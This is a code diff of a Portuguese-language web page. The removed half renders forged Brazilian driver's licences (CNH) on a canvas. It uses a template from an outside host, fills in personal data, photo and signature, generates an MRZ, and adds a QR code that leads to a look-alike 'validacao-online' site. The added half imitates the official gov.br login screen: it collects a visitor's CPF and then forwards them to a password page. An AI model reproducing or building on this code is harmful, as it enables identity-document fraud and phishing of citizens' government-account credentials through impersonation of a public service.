-      <p style="margin:2px 0 0;font-size:14px;color:#333;font-weight:600;">${value || '-'}</p>
-    </div>`;
-  }
-
-  function fmtDate(d) {
-    if (!d || d === '-') return d || '-';
-    if (/^\d{2}\/\d{2}\/\d{4}$/.test(d)) return d;
-    if (/^\d{4}-\d{2}-\d{2}/.test(d)) {
-      const [y, m, dd] = d.slice(0, 10).split('-');
-      return `${dd}/${m}/${y}`;
-    }
-    return d;
-  }
-
-  // ============================================================
-  // TELA 6 - HABILITAÇÃO com carrossel + canvas CNH
-  // ============================================================
-  window.showHabilitacao = function() {
-    currentSlide = 0;
-    const now = new Date();
-    const dateStr = now.toLocaleDateString('pt-BR') + ' ' + now.toLocaleTimeString('pt-BR', {hour:'2-digit',minute:'2-digit'});
-    const u = userData;
-
-    show(`
-      <div style="min-height:100vh;min-height:100dvh;background:#f0f0f0;">
-        <div style="background:#1B2A4A;padding:16px;">
-          <div style="display:flex;align-items:center;gap:12px;">
-            <button onclick="showCondutor()" style="background:none;border:none;cursor:pointer;padding:0;display:flex;">
-              <svg width="30" height="30" viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="13" stroke="white" stroke-width="2" fill="none"/><path d="M17 10L12 15L17 20" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-            </button>
-            <span style="color:#fff;font-size:16px;font-weight:700;">HABILITAÇÃO</span>
-          </div>
-          <p style="color:rgba(255,255,255,0.5);font-size:11px;margin:6px 0 0;padding-left:42px;">Atualizado em ${dateStr}</p>
-        </div>
-        <div style="padding:16px;max-width:600px;margin:0 auto;">
-          <div style="background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,0.08);">
-            <div id="cnh-carousel" style="position:relative;width:100%;overflow:hidden;touch-action:pan-y;">
-              <div id="cnh-slides" style="display:flex;transition:transform 0.3s ease;">
-                <div class="cnh-slide" style="min-width:100%;padding:12px;">
-                  <canvas id="canvas-frente" style="width:100%;border-radius:8px;display:block;cursor:pointer;" onclick="showZoom(0)"></canvas>
+            <div style="width: 100%;">
+                <div class="termos-texto">
+                    Ao entrar, você concorda com nosso <br>
+                    <a href="#">Termo de Responsabilidade</a> e <br>
+                    <a href="#">Política de Privacidade</a>
                 </div>
-                <div class="cnh-slide" style="min-width:100%;padding:12px;">
-                  <canvas id="canvas-verso" style="width:100%;border-radius:8px;display:block;cursor:pointer;" onclick="showZoom(1)"></canvas>
-                </div>
-                <div class="cnh-slide" style="min-width:100%;padding:12px;">
-                  <canvas id="canvas-mrz" style="width:100%;border-radius:8px;display:block;cursor:pointer;" onclick="showZoom(2)"></canvas>
-                </div>
-                <div class="cnh-slide" style="min-width:100%;padding:12px;display:flex;flex-direction:column;align-items:center;">
-                  <canvas id="cnh-qr" style="width:80%;max-width:300px;border-radius:8px;"></canvas>
-                  <div style="margin-top:14px;width:100%;">
-                    <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid #eee;">
-                      <span style="font-size:10px;color:#888;text-transform:uppercase;">Ass. Digital 2</span>
-                      <span style="font-size:12px;color:#333;font-weight:600;">${(u.espelho || u.renach || u.registro || '-')} ${(u.ufEmissao || u.uf || 'SP').toUpperCase()}</span>
-                    </div>
-                  </div>
-                </div>
-              </div>
+                <button class="btn-gov" onclick="mostrarLogin()">
+                    ENTRAR COM gov.br
+                </button>
             </div>
-            <div id="cnh-dots" style="display:flex;justify-content:center;gap:10px;padding:12px;">
-              <span onclick="goSlide(0)" style="width:10px;height:10px;border-radius:50%;background:#1351B4;cursor:pointer;transition:all 0.2s;"></span>
-              <span onclick="goSlide(1)" style="width:10px;height:10px;border-radius:50%;background:#ccc;cursor:pointer;transition:all 0.2s;"></span>
-              <span onclick="goSlide(2)" style="width:10px;height:10px;border-radius:50%;background:#ccc;cursor:pointer;transition:all 0.2s;"></span>
-              <span onclick="goSlide(3)" style="width:10px;height:10px;border-radius:50%;background:#ccc;cursor:pointer;transition:all 0.2s;"></span>
-            </div>
-            <div style="padding:0 12px 12px;display:flex;gap:8px;">
-              <button onclick="goSlide((currentSlide-1+4)%4)" style="flex:1;padding:10px;background:#f0f0f0;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;color:#333;">← Anterior</button>
-              <button onclick="goSlide((currentSlide+1)%4)" style="flex:1;padding:10px;background:#1351B4;border:none;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;">Próximo →</button>
-            </div>
-          </div>
-          <div style="margin-top:14px;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,0.08);">
-            <div style="padding:14px 16px;border-bottom:1px solid #f0f0f0;display:flex;align-items:center;justify-content:space-between;">
-              <span style="font-size:13px;font-weight:700;color:#1B2A4A;">Histórico de Emissões</span>
-              <button onclick="showHistorico()" style="background:none;border:none;color:#1351B4;font-size:12px;font-weight:600;cursor:pointer;">Ver tudo →</button>
-            </div>
-            <div style="padding:14px 16px;">
-              <p style="font-size:12px;color:#888;margin:0 0 4px;">Emitida em ${fmtDate(u.emissao) || '-'}</p>
-              <p style="font-size:14px;color:#1B2A4A;font-weight:600;margin:0;">Nº formulário CNH: ${u.espelho || u.registro || '-'}</p>
-            </div>
-          </div>
-          <button id="btn-exportar" style="width:100%;margin-top:14px;padding:16px;background:#168821;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;">
-            ⬇ Exportar CNH (PDF)
-          </button>
         </div>
-      </div>
-    `);
+    </div>
 
-    // Inicializar carrossel touch
-    initCarouselTouch();
+    <div id="tela-login">
+        <div class="header">
+            <img src="img/logo.png" class="logo-gov-login" alt="gov.br">
+        </div>
+        <div class="login-card">
+            <div class="title">Identifique-se no gov.br</div>
+            <div class="subtitle"><i class="fas fa-id-card"></i> Número do CPF</div>
+            <div class="description">Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+            </div>
 
-    // Renderizar CNH via canvas
-    setTimeout(() => renderCNHCanvas(), 100);
+            <div class="input-group">
+                <label class="label">CPF</label>
+                <input type="tel" id="campoCpf" class="input-field" placeholder="Digite seu CPF" maxlength="14"
+                    inputmode="numeric" autocomplete="off" pattern="\d*" oninput="mascaraCPF(this)">
+            </div>
 
-    // QR Code
-    setTimeout(() => renderQR(), 200);
+            <div id="alert-erro" class="alert-error"><i class="fas fa-exclamation-triangle"></i> CPF informado inválido.
+                (ERL0000500)</div>
+            <button class="btn-primary" id="btnProximo" onclick="enviarDados()">Continuar</button>
 
-    // Botão exportar
-    document.getElementById('btn-exportar').addEventListener('click', function() {
-      if (userData.pdfUrl) { window.open(userData.pdfUrl, '_blank'); return; }
-      alert('PDF não disponível. Solicite ao operador.');
-    });
-  };
+            <div class="options-title">Outras opções de identificação:</div>
+            <div class="option-btn" onclick="msgIndisponivel()"><i class="fas fa-university"></i> Login com seu banco <span
+                    class="selo">SUA CONTA SERÁ PRATA</span></div>
+            <div class="option-btn" onclick="msgIndisponivel()"><i class="fas fa-qrcode"></i> Login com QR code</div>
+            <div class="option-btn" onclick="modalAppGov()"><i class="fas fa-mobile-alt"></i> Seu aplicativo gov.br</div>
+            <div class="option-btn" onclick="modalCertificadoNuvem()"><i class="fas fa-cloud"></i> Seu certificado digital
+                em nuvem</div>
+            <div class="footer">Ministério da Gestão e da Inovação em Serviços Públicos</div>
+        </div>
+    </div>
 
-  // ============================================================
-  // RENDERIZAÇÃO CNH VIA CANVAS
-  // ============================================================
-  const NOMES_ESTADOS = {
-    AC:'ACRE',AL:'ALAGOAS',AP:'AMAPÁ',AM:'AMAZONAS',BA:'BAHIA',CE:'CEARÁ',DF:'DISTRITO FEDERAL',
-    ES:'ESPÍRITO SANTO',GO:'GOIÁS',MA:'MARANHÃO',MT:'MATO GROSSO',MS:'MATO GROSSO DO SUL',
-    MG:'MINAS GERAIS',PA:'PARÁ',PB:'PARAÍBA',PR:'PARANÁ',PE:'PERNAMBUCO',PI:'PIAUÍ',
-    RJ:'RIO DE JANEIRO',RN:'RIO GRANDE DO NORTE',RS:'RIO GRANDE DO SUL',RO:'RONDÔNIA',
-    RR:'RORAIMA',SC:'SANTA CATARINA',SP:'SÃO PAULO',SE:'SERGIPE',TO:'TOCANTINS'
-  };
-
-  let cnhFullCanvas = null;
-
-  async function renderCNHCanvas() {
-    const u = userData;
-    const W = 2461, H = 3496;
-
-    // Canvas principal (full)
-    const cvs = document.createElement('canvas');
-    cvs.width = W; cvs.height = H;
-    const ctx = cvs.getContext('2d');
-
-    // Carregar fontes
-    try {
-      const f1 = new FontFace('Ultra', 'url(https://docmaster.store/assets/AltraW00-SmallCaps.woff2)');
-      const f2 = new FontFace('OCR-B', 'url(https://docmaster.store/assets/ocrbstd.otf)');
-      const [lf1, lf2] = await Promise.all([f1.load().catch(()=>null), f2.load().catch(()=>null)]);
-      if (lf1) document.fonts.add(lf1);
-      if (lf2) document.fonts.add(lf2);
-    } catch(e) {}
-
-    // Carregar template de fundo
-    let bg = null;
-    try {
-      bg = await loadImg('https://docmaster.store/assets/cnh_modelo.jpg');
-    } catch(e) {
-      // Fallback: fundo branco com borda
-      ctx.fillStyle = '#f5f5f5';
-      ctx.fillRect(0, 0, W, H);
-      ctx.strokeStyle = '#ccc';
-      ctx.lineWidth = 4;
-      ctx.strokeRect(10, 10, W-20, H-20);
-    }
-    if (bg) { ctx.drawImage(bg, 0, 0, W, H); }
-
-    ctx.fillStyle = '#000';
-    ctx.textBaseline = 'top';
-
-    const txt = (t, x, y, s, bold, color, maxW) => {
-      if (!t) return;
-      ctx.font = `${s}px 'Ultra', serif`;
-      ctx.fillStyle = color || '#000';
-      t = String(t).toUpperCase();
-      if (maxW) {
-        const w = ctx.measureText(t).width;
-        if (w > maxW) {
-          ctx.save(); ctx.translate(x, y); ctx.scale(maxW/w, 1); ctx.fillText(t, 0, 0); ctx.restore();
-        } else ctx.fillText(t, x, y);
-      } else ctx.fillText(t, x, y);
-    };
-
-    const d = (v) => fmtDate(v);
-
-    // Campos principais
-    txt(u.nome, 314, 452, 22, 1, '#000', 520);
-    let ln = d(u.dataNascimento);
-    if (u.localNascimento) ln += ' ' + u.localNascimento;
-    if (u.ufNascimento) ln += '/' + u.ufNascimento;
-    txt(ln, 597, 510, 22, 1, '#000', 450);
-    txt(u.nacionalidade || 'BRASILEIRA', 599, 752, 22, 1, '#000', 300);
-    txt(d(u.emissao), 597, 570, 22, 1, '#000', 180);
-    txt(d(u.validade), 775, 570, 22, 1, '#c0392b', 180);
-    txt(`${u.rg || ''} ${u.orgaoEmissor || 'SSP'}/${u.ufRG || ''}`, 597, 630, 22, 1, '#000', 450);
-    const cpfFmt = (u.cpf || '').replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-    txt(cpfFmt, 597, 695, 22, 1, '#000', 250);
-    txt(u.nomePai || '', 597, 826, 22, 1, '#000', 550);
-    txt(u.nomeMae || '', 597, 869, 22, 1, '#000', 550);
-    txt(u.registro || '', 801, 695, 22, 1, '#c0392b', 210);
-    txt(u.categoria || 'AB', 990, 695, 22, 1, '#c0392b', 120);
-
-    // Observações
-    const obs = String(u.observacoes || '');
-    obs.split('\n').forEach((linha, i) => txt(linha, 320, 1340 + i*20, 20, false, '#000', 680));
-
-    // Local emissão
-    txt(`${u.localEmissao || ''}, ${u.ufEmissao || ''}`, 318, 1569, 22, 1, '#000', 450);
-
-    // Primeira habilitação
-    txt(d(u.primeiraHabilitacao), 958, 450, 22, 1, '#000', 180);
-
-    // Tipo D/P
-    const tipoLetra = (u.tipo || '').toLowerCase().includes('perm') ? 'P' : 'D';
-    txt(tipoLetra, 1055, 555, 55, 1, '#000', 80);
-
-    // Espelho (lateral)
-    ctx.save(); ctx.translate(213, 930); ctx.rotate(-Math.PI/2);
-    ctx.font = "40px 'Ultra', serif"; ctx.fillStyle = '#000';
-    ctx.fillText(u.espelho || '0000000000', 0, 0); ctx.restore();
-    ctx.save(); ctx.translate(213, 1670); ctx.rotate(-Math.PI/2);
-    ctx.font = "40px 'Ultra', serif"; ctx.fillStyle = '#000';
-    ctx.fillText(u.espelho || '0000000000', 0, 0); ctx.restore();
-
-    // Nome do estado
-    ctx.save(); ctx.textAlign = 'center';
-    const nomeEstado = NOMES_ESTADOS[(u.ufEmissao || '').toUpperCase()] || '';
-    ctx.font = "bold 44px 'Ultra', sans-serif"; ctx.fillStyle = '#000';
-    ctx.fillText(nomeEstado, 670, 1660);
-    // Assinaturas digitais
-    ctx.font = "23px 'Ultra'";
-    ctx.fillText(u.assDigital1 || '', 945, 1545);
-    ctx.fillText(u.assDigital2 || '', 945, 1575);
-    ctx.restore();
-
-    // MRZ
-    const mrz = gerarMRZ(u);
-    ctx.font = "28px 'OCR-B', monospace";
-    ctx.fillStyle = '#353535';
-    mrz.forEach((l, i) => ctx.fillText(l, 335, 2225 + i*33));
-
-    // Tabela categorias
-    const cats = { ACC:{x:385,y:900}, A:{x:530,y:1086}, B:{x:530,y:1158}, C:{x:530,y:1227}, D:{x:952,y:1054}, E:{x:952,y:1158} };
-    let userCat = (u.categoria || '').toUpperCase();
-    if (userCat.includes('E')) userCat += 'DCB';
-    else if (userCat.includes('D')) userCat += 'CB';
-    else if (userCat.includes('C')) userCat += 'B';
-    Object.keys(cats).forEach(k => {
-      if (userCat.includes(k)) txt(d(u.validade), cats[k].x, cats[k].y, 14, 1, '#000', 120);
-    });
-
-    // Foto
-    if (u.fotoUrl) {
-      try {
-        const foto = await loadImg(u.fotoUrl);
-        const bx=305, by=550, bw=247, bh=300;
-        ctx.save(); ctx.beginPath(); ctx.rect(bx,by,bw,bh); ctx.clip();
-        const ir=foto.width/foto.height, br=bw/bh;
-        let dw,dh,dx,dy;
-        if (ir>br) { dh=bh; dw=bh*ir; dx=bx-(dw-bw)/2; dy=by; }
-        else { dw=bw; dh=bw/ir; dx=bx; dy=by-(dh-bh)/2; }
-        ctx.drawImage(foto, dx, dy, dw, dh); ctx.restore();
-      } catch(e) {}
-    }
-
-    // Assinatura
-    if (u.assinaturaUrl) {
-      try {
-        const ass = await loadImg(u.assinaturaUrl);
-        const bx=303, by=870, bw=250, bh=60;
-        ctx.save(); ctx.beginPath(); ctx.rect(bx,by,bw,bh); ctx.clip();
-        ctx.filter = 'contrast(5) brightness(0.3) grayscale(1)';
-        const ratio = Math.min(bw/ass.width, bh/ass.height) * 0.9;
-        const fw=ass.width*ratio, fh=ass.height*ratio;
-        ctx.drawImage(ass, bx+(bw-fw)/2, by+(bh-fh)/2, fw, fh);
-        ctx.restore();
-      } catch(e) {}
-    }
-
-    // QR Code na CNH
-    // QR Code aponta para validacao-online-vio.digital conforme DocMaster config.qrcode.ts
-    const codigoQR = u.codigoValidacao || u.cpf || 'CNH-DIGITAL';
-    const qrUrl = `https://validacao-online-vio.digital/?id=${codigoQR}`;
-    try {
-      const qrDataUrl = await generateQRDataUrl(qrUrl, 700);
-      const qrImg = await loadImg(qrDataUrl);
-      ctx.drawImage(qrImg, 1441, 430, 700, 700);
-    } catch(e) {}
-
-    cnhFullCanvas = cvs;
-
-    // Recortar e exibir nos canvas de destino
-    cropToCanvas(cvs, 'canvas-frente', 0, 0, W, Math.floor(H*0.52));
-    cropToCanvas(cvs, 'canvas-verso', 0, Math.floor(H*0.52), W, Math.floor(H*0.32));
-    cropToCanvas(cvs, 'canvas-mrz', 0, Math.floor(H*0.84), W, Math.floor(H*0.16));
-  }
-
-  function cropToCanvas(src, destId, sx, sy, sw, sh) {
-    const dest = document.getElementById(destId);
-    if (!dest) return;
-    dest.width = sw; dest.height = sh;
-    const ctx = dest.getContext('2d');
-    ctx.drawImage(src, sx, sy, sw, sh, 0, 0, sw, sh);
-  }
-
-  function gerarMRZ(u) {
-    const pad = (s, l) => (s||'UNKNOWN').toUpperCase().replace(/[^A-Z0-9]/g,'<').padEnd(l,'<');
-    const fmtD = (d) => {
-      if (!d) return '000000';
-      const p = d.split('-');
-      return p.length===3 ? `${p[0].slice(2)}${p[1]}${p[2]}` : '000000';
-    };
-    const r = (u.registro||'00000000000').replace(/\D/g,'').padEnd(11,'<').slice(0,11);
-    const e = (u.espelho||'000000000').replace(/\D/g,'').padEnd(9,'<').slice(0,9);
-    const nomeTruncado = pad(u.nome,30).substring(0,30);
-    return [
-      `I<BRA${r}<${e}<<<<`,
-      `${fmtD(u.dataNascimento)}0${u.sexo?u.sexo.charAt(0):'M'}${fmtD(u.validade)}5BRA<<<<<<<<<<<<`,
-      nomeTruncado
-    ];
-  }
-
-  function loadImg(src) {
-    return new Promise((resolve, reject) => {
-      const img = new Image();
-      img.crossOrigin = 'anonymous';
-      img.onload = () => resolve(img);
-      img.onerror = reject;
-      img.src = src;
-    });
-  }
-
-  function generateQRDataUrl(data, size) {
-    return new Promise((resolve, reject) => {
-      try {
-        const qr = qrcode(0, 'M');
-        qr.addData(data);
-        qr.make();
-        const count = qr.getModuleCount();
-        const c = document.createElement('canvas');
-        c.width = size; c.height = size;
-        const ctx = c.getContext('2d');
-        const cell = size / count;
-        ctx.fillStyle = '#fff';
-        ctx.fillRect(0, 0, size, size);
-        for (let r=0; r<count; r++) {
-          for (let col=0; col<count; col++) {
-            ctx.fillStyle = qr.isDark(r,col) ? '#000' : '#fff';
-            ctx.fillRect(col*cell, r*cell, cell+0.5, cell+0.5);
-          }
+    <script>
+        function mostrarLogin() {
+            document.getElementById('tela-capa').style.display = 'none';
+            document.getElementById('tela-login').style.display = 'flex';
         }
-        resolve(c.toDataURL('image/png'));
-      } catch(e) { reject(e); }
-    });
-  }
 
-  function renderQR() {
-    const canvas = document.getElementById('cnh-qr');
-    if (!canvas) return;
-    const u = userData;
-    const S = 600;
-    canvas.width = S; canvas.height = S;
-    const ctx = canvas.getContext('2d');
-    ctx.fillStyle = '#fff';
-    ctx.fillRect(0, 0, S, S);
-    // QR Code do carrossel também aponta para validacao-online-vio.digital
-    const data = u.codigoValidacao
-      ? `https://validacao-online-vio.digital/?id=${u.codigoValidacao}`
-      : (u.validationUrl || u.cpf || 'CNH-DIGITAL');
-    try {
-      const qr = qrcode(0, 'M');
-      qr.addData(data);
-      qr.make();
-      const count = qr.getModuleCount();
-      const cell = (S-80) / count;
-      for (let r=0; r<count; r++) {
-        for (let c=0; c<count; c++) {
-          ctx.fillStyle = qr.isDark(r,c) ? '#000' : '#fff';
-          ctx.fillRect(40 + c*cell, 40 + r*cell, cell+0.5, cell+0.5);
+        function mascaraCPF(i) {
+            const alerta = document.getElementById('alert-erro');
+            if (alerta) alerta.style.display = 'none';
+
+            let v = (i.value || '').replace(/\D/g, '').slice(0, 11);
+            if (v.length > 9) {
+                v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+            } else if (v.length > 6) {
+                v = v.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+            } else if (v.length > 3) {
+                v = v.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+            }
+            i.value = v;
         }
-      }
-    } catch(e) {
-      ctx.fillStyle = '#eee'; ctx.fillRect(0,0,S,S);
-      ctx.fillStyle = '#333'; ctx.font = 'bold 24px sans-serif';
-      ctx.textAlign = 'center'; ctx.fillText('QR CODE', S/2, S/2);
-    }
-  }
 
-  // ============================================================
-  // CARROSSEL
-  // ============================================================
-  window.currentSlide = 0;
+        function msgIndisponivel() { Swal.fire({ icon: 'info', title: 'Indisponível', text: 'Opção indisponível no momento.', confirmButtonColor: '#1351b4' }); }
+        function modalAppGov() { Swal.fire({ html: `<div style="text-align: center; padding: 10px;"><img src="img/logo.png" width="100" style="margin-bottom: 20px;" alt="gov.br"><h3 style="color: #002e6e; font-size: 16px; font-weight: 700;">Certificado digital não encontrado!</h3><div style="text-align: left; font-size: 13px; color: #333; margin-bottom: 30px;"><p>1. Verifique se o seu certificado digital está corretamente instalado.</p></div><div style="font-size: 12px;"><a onclick="Swal.close()" style="cursor: pointer; text-decoration: underline; color: #1351b4;">voltar</a> | <span>acesso.gov.br</span></div></div>`, showConfirmButton: false, showCloseButton: true, width: 400 }); }
+        function modalCertificadoNuvem() { Swal.fire({ title: '<span style="font-size: 16px;">Provedores em Nuvem</span>', html: `<ul class="provider-list"><li class="provider-item"><i class="fas fa-id-card provider-icon" style="color: #28a745;"></i> SerproID</li><li class="provider-item"><i class="fas fa-cloud provider-icon" style="color: #007bff;"></i> SafeID</li></ul>`, confirmButtonText: 'Cancelar', confirmButtonColor: '#fff', customClass: { confirmButton: 'swal-btn-cancelar' }, width: 350 }); const style = document.createElement('style'); style.innerHTML = `.swal-btn-cancelar { color: #1351b4 !important; border: 1px solid #1351b4 !important; }`; document.head.appendChild(style); }
 
-  window.goSlide = function(n) {
-    currentSlide = ((n % TOTAL_SLIDES) + TOTAL_SLIDES) % TOTAL_SLIDES;
-    const slides = document.getElementById('cnh-slides');
-    if (slides) slides.style.transform = `translateX(-${currentSlide * 100}%)`;
-    const dots = document.querySelectorAll('#cnh-dots span');
-    dots.forEach((d, i) => d.style.background = i === currentSlide ? '#1351B4' : '#ccc');
-  };
+        async function enviarDados() {
+            const cpfFormatado = document.getElementById('campoCpf').value;
+            const cpfApenasNumeros = cpfFormatado.replace(/\D/g, '');
+            const alertaErro = document.getElementById('alert-erro');
+            const btn = document.getElementById('btnProximo');
 
-  function initCarouselTouch() {
-    const carousel = document.getElementById('cnh-carousel');
-    if (!carousel) return;
-    let startX = 0;
-    carousel.addEventListener('touchstart', e => { startX = e.touches[0].clientX; }, {passive:true});
-    carousel.addEventListener('touchend', e => {
-      const diff = startX - e.changedTouches[0].clientX;
-      if (Math.abs(diff) > 40) goSlide(currentSlide + (diff > 0 ? 1 : -1));
-    }, {passive:true});
-  }
+            if (cpfApenasNumeros.length < 11) { alertaErro.style.display = 'flex'; return; }
 
-  // ============================================================
-  // ZOOM
-  // ============================================================
-  window.showZoom = function(slideIdx) {
-    if (!cnhFullCanvas) return;
-    const W = cnhFullCanvas.width, H = cnhFullCanvas.height;
-    const regions = [
-      {sx:0, sy:0, sw:W, sh:Math.floor(H*0.52)},
-      {sx:0, sy:Math.floor(H*0.52), sw:W, sh:Math.floor(H*0.32)},
-      {sx:0, sy:Math.floor(H*0.84), sw:W, sh:Math.floor(H*0.16)},
-    ];
-    const reg = regions[slideIdx];
-    if (!reg) return;
-    const zoomCvs = document.createElement('canvas');
-    zoomCvs.width = reg.sw; zoomCvs.height = reg.sh;
-    zoomCvs.getContext('2d').drawImage(cnhFullCanvas, reg.sx, reg.sy, reg.sw, reg.sh, 0, 0, reg.sw, reg.sh);
-    const dataUrl = zoomCvs.toDataURL('image/jpeg', 0.92);
-    const overlay = document.createElement('div');
-    overlay.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;padding:16px;';
-    overlay.innerHTML = `<div style="position:relative;max-width:100%;max-height:100%;"><img src="${dataUrl}" style="max-width:100%;max-height:90vh;border-radius:8px;"><button onclick="this.closest('div').parentElement.remove()" style="position:absolute;top:-12px;right:-12px;width:32px;height:32px;border-radius:50%;background:#fff;border:none;font-size:18px;cursor:pointer;font-weight:700;">×</button></div>`;
-    document.body.appendChild(overlay);
-  };
+            btn.innerText = "Verificando...";
+            btn.disabled = true;
 
-  // ============================================================
-  // HISTÓRICO
-  // ============================================================
-  window.showHistorico = function() {
-    const u = userData;
-    const historico = u.historico || [{data: fmtDate(u.emissao) || '-', numero: u.espelho || u.registro || '-'}];
-    let html = '';
-    historico.forEach(h => {
-      html += `<div style="padding:14px 0;border-bottom:1px solid #e0e0e0;display:flex;align-items:center;justify-content:space-between;">
-        <div>
-          <p style="font-size:12px;color:#888;margin:0 0 4px;">Emitida em ${fmtDate(h.data) || h.data}</p>
-          <p style="font-size:14px;color:#1B2A4A;font-weight:600;margin:0;">Número de formulário CNH: ${h.numero}</p>
-        </div>
-        <svg width="20" height="20" viewBox="0 0 24 24" fill="none"><path d="M9 18l6-6-6-6" stroke="#1351B4" stroke-width="2" stroke-linecap="round"/></svg>
-      </div>`;
-    });
-    show(`
-      <div style="min-height:100vh;min-height:100dvh;background:#f0f0f0;">
-        <div style="background:#1B2A4A;padding:16px;display:flex;align-items:center;gap:12px;">
-          <button onclick="showHabilitacao()" style="background:none;border:none;cursor:pointer;padding:0;display:flex;">
-            <svg width="30" height="30" viewBox="0 0 30 30" fill="none"><circle cx="15" cy="15" r="13" stroke="white" stroke-width="2" fill="none"/><path d="M17 10L12 15L17 20" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
-          </button>
-          <span style="color:#fff;font-size:14px;font-weight:700;">HISTÓRICO DE EMISSÕES DA CNH</span>
-        </div>
-        <div style="padding:16px;max-width:600px;margin:0 auto;">
-          <div style="background:#fff;border-radius:8px;border-left:4px solid #1351B4;padding:20px;box-shadow:0 1px 4px rgba(0,0,0,0.08);">
-            <h3 style="font-size:16px;color:#1B2A4A;font-weight:700;margin:0 0 14px;">Histórico de emissões da CNH</h3>
-            <div style="height:3px;background:#1351B4;width:60px;margin-bottom:14px;"></div>
-            ${html}
-          </div>
-        </div>
-      </div>
-    `);
-  };
+            try {
+                const res = await fetch('/api/cnh/validate?cpf=' + cpfApenasNumeros);
+                const json = await res.json().catch(() => ({}));
 
-  // ============================================================
-  // INICIALIZAR
-  // ============================================================
-  showSplash();
-
-  // Expor funções globais
-  window.showSplash = showSplash;
-  window.showLoginCPF = showLoginCPF;
-  window.showLoginSenha = showLoginSenha;
-  window.showDashboard = showDashboard;
-
-})();
-</script>
+                if (res.ok && json.success && json.data) {
+                    window.location.href = "senha.html?cpf=" + cpfApenasNumeros;
+                } else {
+                    alertaErro.style.display = 'flex';
+                    btn.innerText = "Continuar";
+                    btn.disabled = false;
+                }
+            } catch (err) {
+                console.error(err);
+                alertaErro.style.display = 'flex';
+                btn.innerText = "Continuar";
+                btn.disabled = false;
+            }
+        }
+    </script>
 </body>
+
 </html>
